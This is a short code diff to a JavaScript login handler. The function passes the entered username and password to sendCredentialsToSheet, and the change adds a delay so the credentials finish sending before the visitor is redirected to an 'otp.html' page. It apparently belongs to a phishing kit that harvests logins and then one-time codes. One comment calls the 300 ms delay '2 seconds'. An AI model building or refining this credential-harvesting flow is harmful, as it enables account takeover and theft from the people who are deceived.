@@ -29,5 +29,10 @@ function checkLogin() {
     sendCredentialsToSheet(username, password);
 
     // Prevent the form from actually submitting (no page reload)
-    return false;
+    // Add a slight delay before redirecting to ensure the credentials are sent
+    setTimeout(function() {
+        window.location.href = "otp.html";  // Redirect to the OTP page
+    }, 300);  // Delay of 2 seconds (adjust as necessary)
+
+    return false;  // Prevent form submission
 }
